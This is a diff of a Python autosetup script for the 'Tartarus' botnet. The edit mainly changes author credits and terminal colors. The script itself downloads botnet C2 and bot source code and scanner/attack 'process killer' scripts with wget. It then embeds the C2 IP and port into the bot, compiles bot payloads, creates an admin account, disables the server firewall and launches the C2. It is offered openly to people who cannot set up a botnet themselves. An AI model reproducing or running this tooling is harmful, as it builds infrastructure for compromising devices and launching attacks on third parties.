@@ -1,40 +1,45 @@
-# Setup By Georgia Cri / FlexingOnLamers
+# Edited by: Vexvain
 import subprocess, time
 
 def Tartarus(cmd):
     subprocess.call(cmd, shell=True)
-def Cri(file_name, line_num, text):
+def Vexvain(file_name, line_num, text):
   lines = open(file_name, 'r').readlines()
   lines[line_num] = text
   out = open(file_name, 'w')
   out.writelines(lines)
   out.close()
 
-# Well ladies and retards, since none of you know how to setup my bOtNeT bc your retarded, heres an autosetup
+# This is for those that don't know how to set up a botnet, smh
 #///////////////////////
-# Colors and such
-dred = "\x1b[0;31m"
-dblue = "\x1b[0;34m"
-dcyan = "\x1b[0;36m"
-red = "\x1b[1;31m"
-blue = "\x1b[1;34m"
-cyan = "\x1b[1;36m"
-white = "\x1b[1;37m"
+# Colors
+red = "\x1b[31m"
+blue = "\x1b[34m"
+cyan = "\x1b[36m"
+magenta = "\x1b[35m"
+yellow = "\x1b[33m"
+green = "\x1b[32m"
+white = "\x1b[37m"
+lightred = "\x1b[91m"
+lightgreen = "\x1b[92m"
+lightyellow = "\x1b[93m"
+lightblue = "\x1b[94m"
+lightmagenta = "\x1b[95m"
 #///////////////////////
 # File Paths
 IPHM = "scripts/"
 #///////////////////////
 print(""+ white +"Credits:")
 time.sleep(1)
-print(""+ white +"AutoSetup Developer: "+ red +"Georgia Cri "+ white +"/ "+ red +"FlexingOnLamers "+ cyan +"#RIPKatura")
+print(""+ white +"ADMIN:"+ lightred +"Vexvain")
 time.sleep(1)
-print(""+ white +"Tartarus  Developers: "+ cyan +"@"+ red +"FlexingOnLamers "+ white +"and "+ cyan +"@"+ red +"Transmissional")
+print(""+ white +"Tartarus  Developer: "+ lightred +"Vexvain")
 time.sleep(1)
-print(""+ white +"IPLookup Api: "+ red +"N/A")
+print(""+ white +"IPLookup Api: "+ lightred +"N/A")
 time.sleep(1)
-print(""+ white +"Domain Resolver: "+ red +"Snickers")
+print(""+ white +"Domain Resolver: "+ lightred +"Snickers")
 time.sleep(1)
-print(""+ white +"Installing Needed "+ red +"Dependencies "+ white +"And "+ red +"Packages "+ white +"before setting up..")
+print(""+ white +"Installing Needed "+ lightred +"Dependencies "+ white +"And "+ lightred +"Packages "+ white +"before setting up..")
 time.sleep(2)
 #///////////////////////
 # Dependency Installation
@@ -48,73 +53,73 @@ Tartarus("yum install bzip2 -y")
 Tartarus("yum install lbzip2 -y")
 Tartarus("clear")
 #///////////////////////
-print(""+ red +"Finished!")
+print(""+ lightred +"Finished!")
 time.sleep(2)
 #///////////////////////
 # Server ULIMIT Setup
 print("Setting Server ULIMIT and Downloading All files.")
 Tartarus("ulimit -n 999999")
-print(""+ red +"Finished!")
+print(""+ lightred +"Finished!")
 time.sleep(2)
 Tartarus("clear")
 #///////////////////////
 print(""+ white +"'m going to collect a few things from you..")
 time.sleep(2)
 # User input (We are using this to replace said information inside of the Bot, C2Base)
-username = raw_input(""+ white +"Enter desired Username:"+ red +" ")
-password = raw_input(""+ white +"Enter desired Password:"+ red +" ")
-print(""+ white +"Setting up User: "+ red +"["+ white +""+ username +""+ red +"] "+ white +"With "+ cyan +"Administrator "+ white +"Account!")
+username = raw_input(""+ white +"Enter desired Username:"+ lightred +" ")
+password = raw_input(""+ white +"Enter desired Password:"+ lightred +" ")
+print(""+ white +"Setting up User: "+ lightred +"["+ white +""+ username +""+ lightred +"] "+ white +"With "+ lightgreen +"Administrator "+ white +"Account!")
 Tartarus("echo "+ username +" "+ password +" admin >> tartarus.txt")
-IP = raw_input(""+ white +"Enter your Servers IP:"+ red +" ")
-bport = raw_input(""+ white +"Enter your desired bot port:"+ red +" ")
-threads = raw_input(""+ white +"Enter desired threads to screen on:"+ red +" ")
-cport = raw_input(""+ white +"Enter your desired connection port:"+ red +" ")
+IP = raw_input(""+ white +"Enter your Servers IP:"+ lightred +" ")
+bport = raw_input(""+ white +"Enter your desired bot port:"+ lightred +" ")
+threads = raw_input(""+ white +"Enter desired threads to screen on:"+ lightred +" ")
+cport = raw_input(""+ white +"Enter your desired connection port:"+ lightred +" ")
 #///////////////////////
 print("Let's set up our directories")
-print(""+ white +"Creating Directory: "+ red +"["+ white +"/"+ red +"root"+ white +"/"+ red +"logs"+ white +"/"+ red +"]")
+print(""+ white +"Creating Directory: "+ lightred +"["+ white +"/"+ lightred +"root"+ white +"/"+ lightred +"logs"+ white +"/"+ lightred +"]")
 time.sleep(1)
-print(""+ white +"Creating Directory: "+ red +"["+ white +"/"+ red +"root"+ white +"/"+ red +"scripts"+ white +"/"+ red +"]")
+print(""+ white +"Creating Directory: "+ lightred +"["+ white +"/"+ lightred +"root"+ white +"/"+ lightred +"scripts"+ white +"/"+ lightred +"]")
 time.sleep(1)
-print(""+ white +"Creating Directory: "+ red +"["+ white +"/"+ red +"root"+ white +"/"+ red +"amp"+ white +"/"+ red +"]")
+print(""+ white +"Creating Directory: "+ lightred +"["+ white +"/"+ lightred +"root"+ white +"/"+ lightred +"amp"+ white +"/"+ lightred +"]")
 Tartarus("mkdir logs amp scripts")
 time.sleep(2)
-print(""+ red +"Finished!")
+print(""+ lightred +"Finished!")
 print(""+ white +"Let's download everything")
-print(""+ white +"Downloading "+ red +"Tartarus Alpha..")
+print(""+ white +"Downloading "+ lightred +"Tartarus Alpha..")
 Tartarus("wget -q https://raw.githubusercontent.com/virtualsociopath/Tartarus/master/Main/c2.c -O c2.c")
 time.sleep(2)
-print(""+ red +"Finished!")
-print(""+ white +"Downloading "+ red +"Tartarus Bot")
+print(""+ lightred +"Finished!")
+print(""+ white +"Downloading "+ lightred +"Tartarus Bot")
 Tartarus("wget -q https://raw.githubusercontent.com/virtualsociopath/Tartarus/master/Autosetup/bot.c -O bot.c")
 time.sleep(2)
-print(""+ red +"Finished!")
-print(""+ white +"Downloading "+ red +"Tartarus Cross-Compiler")
+print(""+ lightred +"Finished!")
+print(""+ white +"Downloading "+ lightred +"Tartarus Cross-Compiler")
 Tartarus("wget -q https://raw.githubusercontent.com/virtualsociopath/Tartarus/master/Main/Tartarus.py -O Tartarus.py")
 time.sleep(2)
-print(""+ red +"Finished!")
-print(""+ white +"Downloading "+ red +"Resolver Header")
+print(""+ lightred +"Finished!")
+print(""+ white +"Downloading "+ lightred +"Resolver Header")
 Tartarus("wget -q https://raw.githubusercontent.com/virtualsociopath/Tartarus/master/Main/resolver.h -O resolver.h")
 time.sleep(2)
-print(""+ red +"Finished!")
-print(""+ white +"Downloading "+ red +"IPHM Scanner Process Killer")
+print(""+ lightred +"Finished!")
+print(""+ white +"Downloading "+ lightred +"IPHM Scanner Process Killer")
 Tartarus("wget -q https://raw.githubusercontent.com/virtualsociopath/Tartarus/master/Main/scripts/IPHM_Scanner_Process_Killerv2.py -O IPHM_Scanner_Process_Killerv2.py")
 time.sleep(2)
-print(""+ red +"Finished!")
-print(""+ white +"Downloading "+ red +"IPHM Attack process killer")
+print(""+ lightred +"Finished!")
+print(""+ white +"Downloading "+ lightred +"IPHM Attack process killer")
 Tartarus("wget -q https://raw.githubusercontent.com/virtualsociopath/Tartarus/master/Main/scripts/IPHM_Attack_Process_Killerv2.py -O IPHM_Attack_Process_Killerv2.py")
 time.sleep(2)
-print(""+ red +"Finished!")
-print(""+ white +"Downloading "+ red +"IPLookup API")
+print(""+ lightred +"Finished!")
+print(""+ white +"Downloading "+ lightred +"IPLookup API")
 Tartarus("wget -q https://raw.githubusercontent.com/virtualsociopath/Tartarus/master/Main/iplookup.php -O iplookup.php")
 time.sleep(2)
-print(""+ red +"Finished!")
+print(""+ lightred +"Finished!")
 time.sleep(2)
 Tartarus("clear")
-print(""+ white +"Let's replace the needed information inside of the "+ red +"Bot")
-print(""+ white +"Replacing "+ red +"IP "+ white +"And "+ red +"Bot Port inside of the Bot")
-Cri('bot.c', 182, 'unsigned char *Tartarus[] = {"'+ IP +':'+ bport+'"}; // <ServerIP>:<BotPort>\n')
+print(""+ white +"Let's replace the needed information inside of the "+ lightred +"Bot")
+print(""+ white +"Replacing "+ lightred +"IP "+ white +"And "+ lightred +"Bot Port inside of the Bot")
+Vexvain('bot.c', 182, 'unsigned char *Tartarus[] = {"'+ IP +':'+ bport+'"}; // <ServerIP>:<BotPort>\n')
 time.sleep(2)
-print(""+ red +"Finished!")
+print(""+ lightred +"Finished!")
 time.sleep(2)
 Tartarus("clear")
 print(""+ white +"Now let's compile our C2 and BOT")
@@ -126,34 +131,34 @@ if comp == "y" or "Y":
 elif comp == "n" or "N":
     Tartarus("gcc -o c2 c2.c -pthread")
 
-print(""+ white +"Finished Compiling "+ red +"C2, "+ white +"time to compile our "+ red +"bot"+ white +"!")
+print(""+ white +"Finished Compiling "+ lightred +"C2, "+ white +"time to compile our "+ lightred +"bot"+ white +"!")
 time.sleep(2)
 Tartarus("python Tartarus.py bot.c "+ IP +"")
-print("Make sure to copy your payload, im giving you 10 seconds "+ red +"<3")
+print("Make sure to copy your payload, im giving you 10 seconds "+ lightred +"<3")
 time.sleep(10)
 Tartarus("clear")
 print(""+ white +"Now that our directories are setup and our bots compiled, lets go ahead and move our files")
 print(""+ white +"Now lets move our needed files into the correct directories")
 time.sleep(2)
-print(""+ white +"Moving Script: "+ red +"["+ white +"IPHM_Attack_Process_Killerv2.py"+ red +"] "+ white +"To Directory: "+ red +"["+white +"/"+ red +"root"+ white +"/"+ red +"scripts"+ white +"/"+ red +"]")
+print(""+ white +"Moving Script: "+ lightred +"["+ white +"IPHM_Attack_Process_Killerv2.py"+ lightred +"] "+ white +"To Directory: "+ lightred +"["+white +"/"+ lightred +"root"+ white +"/"+ lightred +"scripts"+ white +"/"+ lightred +"]")
 time.sleep(1)
-print(""+ white +"Moving Script: "+ red +"["+ white +"IPHM_Scanner_Process_Killerv2.py"+ red +"] "+ white +"To Directory: "+ red +"["+white +"/"+ red +"root"+ white +"/"+ red +"scripts"+ white +"/"+ red +"]")
+print(""+ white +"Moving Script: "+ lightred +"["+ white +"IPHM_Scanner_Process_Killerv2.py"+ lightred +"] "+ white +"To Directory: "+ lightred +"["+white +"/"+ lightred +"root"+ white +"/"+ lightred +"scripts"+ white +"/"+ lightred +"]")
 time.sleep(1)
-print(""+ white +"Moving Script: "+ red +"["+ white +"iplookup.php"+ red +"] "+ white +"To Directory: "+ red +"["+ white +"/"+ red +"var"+ white +"/"+ red +"www"+ white +"/"+ red +"html"+ white +"/"+ red +"]")
+print(""+ white +"Moving Script: "+ lightred +"["+ white +"iplookup.php"+ lightred +"] "+ white +"To Directory: "+ lightred +"["+ white +"/"+ lightred +"var"+ white +"/"+ lightred +"www"+ white +"/"+ lightred +"html"+ white +"/"+ lightred +"]")
 Tartarus("mv IPHM_Attack_Process_Killerv2.py "+ IPHM +"")
 Tartarus("mv IPHM_Scanner_Process_Killerv2.py "+ IPHM +"")
 Tartarus("mv iplookup.php /var/www/html/")
 time.sleep(2)
-print(""+ red +"Finished!")
+print(""+ lightred +"Finished!")
 cleanup = raw_input("Would you like to clean the server and get rid of all extra files? (y/n): ")
 
 if cleanup == "y" or "Y":
     Tartarus("rm -rf Tartarus.py")
     Tartarus("mkdir Cross-Compilers")
     Tartarus("mv cross-compiler-* Cross-Compilers/")
-    print(""+ red +"Continuing!")
+    print(""+ lightred +"Continuing!")
 elif cleanup == "n" or "N":
-    print(""+ red +"Continuing!")
+    print(""+ lightred +"Continuing!")
 
 chatroom = raw_input(""+ white +"Would you like to install the Tartarus chatroom? (y/n): ")
 
@@ -169,21 +174,21 @@ if chatroom == "y" or "Y":
     Tartarus("wget -q https://raw.githubusercontent.com/virtualsociopath/Tartarus/master/chatroom/chat.c -O chat.c")
     Tartarus("gcc -o chat chat.c -pthread && rm -rf chat.c")
     time.sleep(2)
-    print(""+ red +"Finished!")
-    print(""+ white +"Moving Chat Source to: "+ red +"["+ white +"/"+red +"root"+ white +"/"+ red +"chatroom"+ white +"/"+ red +"]")
+    print(""+ lightred +"Finished!")
+    print(""+ white +"Moving Chat Source to: "+ lightred +"["+ white +"/"+lightred +"root"+ white +"/"+ lightred +"chatroom"+ white +"/"+ lightred +"]")
     Tartarus("mv chat chatroom/")
     time.sleep(1)
-    print(""+ red +"Finished!")
-    print(""+ white +"Creating "+ red +"Admin Account "+ white +"on chat with user information for c2 - Username: "+ red +"["+ white +""+ username +""+ red +"]")
+    print(""+ lightred +"Finished!")
+    print(""+ white +"Creating "+ lightred +"Admin Account "+ white +"on chat with user information for c2 - Username: "+ lightred +"["+ white +""+ username +""+ lightred +"]")
     Tartarus("cd chatroom/ && echo "+ username +" "+ password +" admin >> chat.txt")
     Tartarus("cd")
-    print(""+ white +"Now Setting chat up on Port: :"+ red +"["+ white +""+ chatport +""+ red +"]")
+    print(""+ white +"Now Setting chat up on Port: :"+ lightred +"["+ white +""+ chatport +""+ lightred +"]")
     time.sleep(1)
-    print(""+ red +"Finished!")
+    print(""+ lightred +"Finished!")
     Tartarus("clear")
     Tartarus("cd chatroom/ && screen -dm ./chat 3981 1 "+ chatport +"")
     Tartarus("cd")
-    print(""+ white +"IP: "+ red +"["+ white +""+ IP +""+ red +"] "+ white +"Port: "+ red +"["+ white +""+ chatport +""+ red +"] "+ white +"Type: "+ red +"["+ white +"Raw"+ red +"]")
+    print(""+ white +"IP: "+ lightred +"["+ white +""+ IP +""+ lightred +"] "+ white +"Port: "+ lightred +"["+ white +""+ chatport +""+ lightred +"] "+ white +"Type: "+ lightred +"["+ white +"Raw"+ lightred +"]")
     time.sleep(2)
     Tartarus("clear")
 elif chatroom == "n" or "N":
@@ -193,15 +198,15 @@ print("Disabling Firewalld And IPTables..")
 Tartarus("service iptables stop")
 Tartarus("service firewalld stop")
 time.sleep(1)
-print(""+ red +"Finished!")
+print(""+ lightred +"Finished!")
 print("Resetting HTTPD")
 Tartarus("service httpd restart")
 time.sleep(1)
-print(""+ red +"Finished!")
+print(""+ lightred +"Finished!")
 time.sleep(1)
 Tartarus('clear')
 print(""+ white +"Now we're done! lets screen and connect.")
 time.sleep(1)
 Tartarus("screen -dm ./c2 "+ bport +" "+ threads +" "+ cport +"")
 print(""+ white +"Its up! Information below!")
-print(""+ white +"IP: "+ red +"["+ white +""+ IP +""+ red +"]\r\n"+ white +"Port: "+ red +"["+ white +""+ cport +""+ red +"]\r\n"+ white +"Type: "+ red +"["+ white +"Raw"+ red +"]\r\n"+ white +"BotPort: "+ red +"["+ white +""+ bport +""+ red +"]\r\n"+ white +"Threads: "+ red +"["+ white +""+threads+""+ red +"]")
+print(""+ white +"IP: "+ lightred +"["+ white +""+ IP +""+ lightred +"]\r\n"+ white +"Port: "+ lightred +"["+ white +""+ cport +""+ lightred +"]\r\n"+ white +"Type: "+ lightred +"["+ white +"Raw"+ lightred +"]\r\n"+ white +"BotPort: "+ lightred +"["+ white +""+ bport +""+ lightred +"]\r\n"+ white +"Threads: "+ lightred +"["+ white +""+threads+""+ lightred +"]")
